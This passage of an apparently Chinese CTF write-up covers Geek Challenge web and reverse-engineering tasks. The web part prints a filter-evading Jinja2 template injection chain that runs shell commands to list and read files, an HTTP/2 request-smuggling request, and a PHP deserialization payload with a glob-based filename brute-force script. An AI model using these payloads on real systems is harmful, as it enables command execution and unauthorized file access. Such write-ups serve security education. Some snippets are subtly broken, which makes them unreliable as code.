f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>得到flag文件名 <code>fl4gfl4gfl4g</code>，再读flag文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="EZ-Smuggling"><a href="#EZ-Smuggling" class="headerlink" title="EZ_Smuggling"></a>EZ_Smuggling</h3><blockquote><p>这是一个简单的H2转H1的小网站，站长认为他很安全，没有人能在他的网站走私任何东西。 题目链接:<a href="https://47.108.56.168:20231/">https://47.108.56.168:20231/</a> 备用链接1:<a href="https://47.108.56.168:20232/">https://47.108.56.168:20232/</a> 备用链接2:<a href="https://47.108.56.168:20233/">https://47.108.56.168:20233/</a></p></blockquote><p>H2.CL请求走私，参考：</p><p><a href="https://sc.scomurr.com/http-request-smuggling-http-2-downgrade-attack-part-2/">HTTP Request Smuggling – HTTP/2 Downgrade Attack Part 2</a></p><p>构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/2</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: 47.108.56.168:20231</span><br><span class="line">Cookie: session=MTcwMDQ5OTczNnwzRERyQTlLa0hLMlp4YW9McS1yOHh6VVFHQktaRHdWREc2cEtlNTZwTG5XMV9Ic0lGd3h1QzhCNkkxeFJLLXlYYlN0enhQdWpHRkltTjhfUEhEdThMejdKMFJ5YmVaMFV8Zx0CM7urEt3li5yAVGtbS4fn-CoU8kNQ2W_IosQOhg8=</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>即可得flag：<code>SYC&#123;http2_5muggl1ng_15_1nt3r3st1ng&#125;</code>。</p><p>​    </p><h3 id="klf-3"><a href="#klf-3" class="headerlink" title="klf_3"></a>klf_3</h3><blockquote><p>”好好好这都给你们做出来了，这次我拜托了pursue0h帮我收集了你们前几次的payload，这次绝对不可能让你们做出来，你们绝对是klf“</p></blockquote><p><code>robots.txt</code>  得到路由 <code>/secr3ttt</code>，同klf_2相同打法即可。</p><p>列目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(ls=a)|join,sp,d,dict(ap=a,p=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>得到flag文件名 <code>fl4gfl4gfl4g</code>，再读flag文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;% set pp=dict(po=a,p=a)|join%&#125;</span><br><span class="line">&#123;% set ppe=dict(po=a,pen=a)|join%&#125;</span><br><span class="line">&#123;% set gt=dict(ge=a,t=a)|join%&#125;</span><br><span class="line">&#123;% set so=dict(o=a,s=a)|join %&#125;</span><br><span class="line">&#123;% set rd=dict(re=a,ad=a)|join%&#125;</span><br><span class="line">&#123;% set xhx=(lipsum|string|list)|attr(pp)(18) %&#125;</span><br><span class="line">&#123;% set gb=(xhx,xhx,dict(glob=a,als=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set bin=(xhx,xhx,dict(buil=a,tins=a)|join,xhx,xhx)|join %&#125;</span><br><span class="line">&#123;% set cr=dict(ch=a,r=a)|join%&#125;</span><br><span class="line">&#123;% set char=(lipsum|attr(gb))|attr(gt)(bin)|attr(gt)(cr) %&#125;</span><br><span class="line">&#123;% set sp=char(32)%&#125;</span><br><span class="line">&#123;% set d=char(4７)%&#125;</span><br><span class="line">&#123;% set op=(dict(c=a,at=a)|join,sp,d,dict(ap=a,p=a)|join,d,dict(fl4gfl4gfl4g=a)|join)|join %&#125;</span><br><span class="line">&#123;% set f=(lipsum|attr(gb))|attr(gt)(so)|attr(ppe)(op)|attr(rd)() %&#125;</span><br><span class="line">&#123;%print(f)%&#125;</span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Akane"><a href="#Akane" class="headerlink" title="Akane!"></a>Akane!</h3><blockquote><p>最适合梅菲斯特的一题</p></blockquote><p>glob协议侧信道爆破文件名。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Idol</span>:</span><br><span class="line">    public_Akane=<span class="string">&#x27;glob:///etc/passss&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Hoshino</span>:</span><br><span class="line">    public_Ruby=Idol()</span><br><span class="line"></span><br><span class="line">res = res.replace(<span class="string">b&#x27;&quot;Hoshino&quot;:1&#x27;</span>,<span class="string">b&#x27;&quot;Hoshino&quot;:2&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(res))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:1:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br><span class="line"><span class="comment"># 绕wakeup</span></span><br><span class="line"><span class="comment"># O:7:&quot;Hoshino&quot;:2:&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;s:5:&quot;Akane&quot;;s:18:&quot;glob:///etc/passwd&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;https://zwgadnbkohe7t6xz02urbct9b.node.game.sycsec.com/?tuizi=&#x27;</span></span><br><span class="line">filename = <span class="string">&#x27;/var/www/html/The************************.php&#x27;</span></span><br><span class="line">dic = string.printable</span><br><span class="line"></span><br><span class="line">name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        guess = <span class="string">f&#x27;glob:///var/www/html/The<span class="subst">&#123;name+j&#125;</span><span class="subst">&#123;<span class="string">&quot;*&quot;</span>*(<span class="number">23</span>-<span class="built_in">len</span>(name))&#125;</span>.php&#x27;</span></span><br><span class="line">        payload = <span class="string">f&#x27;O:7:&quot;Hoshino&quot;:2:&#123;&#123;s:4:&quot;Ruby&quot;;O:4:&quot;Idol&quot;:1:&#123;&#123;s:5:&quot;Akane&quot;;s:<span class="subst">&#123;<span class="built_in">len</span>(guess)&#125;</span>:&quot;<span class="subst">&#123;guess&#125;</span>&quot;;&#125;&#125;&#125;&#125;&#x27;</span>.encode()</span><br><span class="line">        r = requests.get(<span class="string">f&#x27;<span class="subst">&#123;url&#125;</span><span class="subst">&#123;base64.b64encode(payload).decode()&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Kurokawa Akane&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            name += j</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># S4crEtF1AgFi1EByo2takuXX</span></span><br></pre></td></tr></table></figure><p>再访问 <code>/var/www/html/TheS4crEtF1AgFi1EByo2takuXX.php</code> 即可得flag。</p><p>​    </p><h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="shiftjmp"><a href="#shiftjmp" class="headerlink" title="shiftjmp"></a>shiftjmp</h3><blockquote><p>跳到哪里去了？</p></blockquote><p>用IDA解析程序崩溃，改用Ghidra解析：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">undefined8 <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  uint uVar1;</span><br><span class="line">  uint uStack12;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;flag:&quot;</span>);</span><br><span class="line">  uStack12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span>( <span class="literal">true</span> ) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x21</span> &lt; (<span class="type">int</span>)uStack12) &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;yes&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    uVar1 = func_0x00101070();</span><br><span class="line">    <span class="keyword">if</span> ((uVar1 ^ uStack12) != (<span class="type">int</span>)(<span class="type">char</span>)rodata[uStack12]) <span class="keyword">break</span>;</span><br><span class="line">    uStack12 = uStack12 + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>逻辑为简单异或操作，还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rodata = <span class="built_in">list</span>(<span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;5358417853366a6438646f547842517b78224d61276373452d7c456c2c6f2f7b5e5c&#x27;</span>))</span><br><span class="line">flag = [rodata[i]^i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;W3lc0me_tO_th3_r3veR5e_w0r1d~&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="点击就送的逆向题"><a href="#点击就送的逆向题" class="headerlink" title="点击就送的逆向题"></a>点击就送的逆向题</h3><blockquote><p>代码如何到可执行二进制文件?(记得将得到的正确字符串包裹上SYC{}!!!!!!!)</p></blockquote><p>将s文件编译：<code>gcc xxx.s -o xxx</code></p><p>关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line"><span class="built_in">strcpy</span>(s2, <span class="string">&quot;Z`J[X^LMNO`PPJPVQRSIUTJ]IMNOZKMM&quot;</span>);</span><br><span class="line">__isoc99_scanf(&amp;unk_2004, s1);</span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  s1[i] += <span class="number">7</span>;</span><br><span class="line"><span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, s2) )</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;good!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>逻辑为ROT7，cyberchef还原为 <code>SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF</code>。</p><p>flag：<code>SYC&#123;SYCTQWEFGHYIICIOJKLBNMCVBFGHSDFF&#125;</code></p><p>​    </p><h3 id="easymath"><a href="#easymath" class="headerlink" title="easymath"></a>easymath</h3><blockquote><p>别担心，没学过线性代数也可以做出来，听说z3老师很厉害。flag请使用SYC{}包裹。</p></blockquote><p>前部分代码为 $\mathbb{Z}_{32}$ 下矩阵乘法：$L \cdot M = I$</p><p>后部分代码，根据代码测试代码逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;c01234_asdzxpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">pos = [table.index(flag[i])+<span class="number">48</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag))]</span><br><span class="line"><span class="built_in">print</span>(pos)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(pos))</span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">last = [num[k-<span class="number">48</span>] <span class="keyword">for</span> k <span class="keyword">in</span> pos]</span><br><span class="line"><span class="built_in">print</span>(last)</span><br></pre></td></tr></table></figure><p>逻辑为将flag按照num来编序号。</p><p>还原脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">M = matrix(Zmod(<span class="number">32</span>), [[<span class="number">18</span>, <span class="number">29</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">27</span>], [<span class="number">8</span>, <span class="number">31</span>, <span class="number">8</span>, <span class="number">23</span>, <span class="number">30</span>], [<span class="number">29</span>, <span class="number">3</span>, <span class="number">28</span>, <span class="number">10</span>, <span class="number">21</span>], [<span class="number">18</span>, <span class="number">29</span>, <span class="number">8</span>, <span class="number">16</span>, <span class="number">28</span>], [<span class="number">11</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">7</span>]])</span><br><span class="line">I = identity_matrix(Zmod(<span class="number">32</span>), <span class="number">5</span>)</span><br><span class="line">L = I*M^-<span class="number">1</span></span><br><span class="line">m = L.<span class="built_in">list</span>()</span><br><span class="line"></span><br><span class="line">num = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">16</span>, <span class="number">19</span>, <span class="number">22</span>, <span class="number">26</span>, <span class="number">27</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">50</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">flag = [table[num.index(m[i])] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># xtd4co_ymiunbbx3Aypsmbzii</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;xtd4co_ymiunbbx3Aypsmbzii&#125;</code></p><p>​    </p><h3 id="幸运数字"><a href="#幸运数字" class="headerlink" title="幸运数字"></a>幸运数字</h3><blockquote><p>试试今天的运势</p></blockquote><p>按逻辑还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">13</span>,   <span class="number">7</span>,  <span class="number">29</span>,  <span class="number">37</span>,  <span class="number">29</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">57</span>,  <span class="number">44</span>,  <span class="number">63</span>, </span><br><span class="line">   <span class="number">42</span>,  <span class="number">43</span>,  <span class="number">50</span>,  <span class="number">63</span>,  <span class="number">42</span>,  <span class="number">55</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">48</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">45</span>,   <span class="number">1</span>,   <span class="number">7</span>,  <span class="number">49</span>,  <span class="number">43</span>,   <span class="number">1</span>,  <span class="number">57</span>,  <span class="number">31</span>,  <span class="number">59</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">45</span>,  <span class="number">27</span>,  <span class="number">58</span>,   <span class="number">1</span>,  <span class="number">12</span>, <span class="number">111</span>,  <span class="number">57</span>,  <span class="number">54</span>,  <span class="number">42</span>, </span><br><span class="line">   <span class="number">35</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">return</span> k*(k+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    x = [data[i]^(cal(k)%<span class="number">0xd3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line">    <span class="keyword">if</span> x[-<span class="number">1</span>] == <span class="number">125</span>:</span><br><span class="line">        <span class="built_in">print</span>(k, <span class="built_in">bytes</span>(x))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;C0ngratulati0nnnns_You_gAessEd_R1ght&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="听说cpp很难？"><a href="#听说cpp很难？" class="headerlink" title="听说cpp很难？"></a>听说cpp很难？</h3><blockquote><p>xxx师傅偶然听到有人说cpp很难，真的很难吗？不会吧，不会吧。于是，X师傅连忙出了一道给大伙儿涨涨信心。</p></blockquote><p>动调，得到逻辑为 $[(9+1) \oplus (f_i+10)]-9-1$。</p><p>爆破还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, -<span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">120</span>, -<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">9</span>+<span class="number">1</span>)^(x+<span class="number">10</span>))-<span class="number">9</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">f=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> cal(j) == c[i]:</span><br><span class="line">            f.append(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYCAnma1nG_y0u_maKe_it_1alaIa~~&#x27;</span></span><br></pre></td></tr></table></figure><p>flag：<code>SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125;</code></p><p>​    </p><h3 id="砍树"><a href="#砍树" class="headerlink" title="砍树"></a>砍树</h3><blockquote><p>你会安卓吗?我反正不会</p></blockquote><p>jadx查看apk，用IDA在so文件中查看主要逻辑：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">Java_com_sky_ezreeeee_MainActivity_I0o0I</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v9; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v10; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a3);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a4);</span><br><span class="line">  v6 = A0OWO0A(v10, v9);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;unk_14900, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    v7 = *(<span class="type">unsigned</span> __int8 *)(v6 + i) == (<span class="type">unsigned</span> __int8)dest[i];</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span 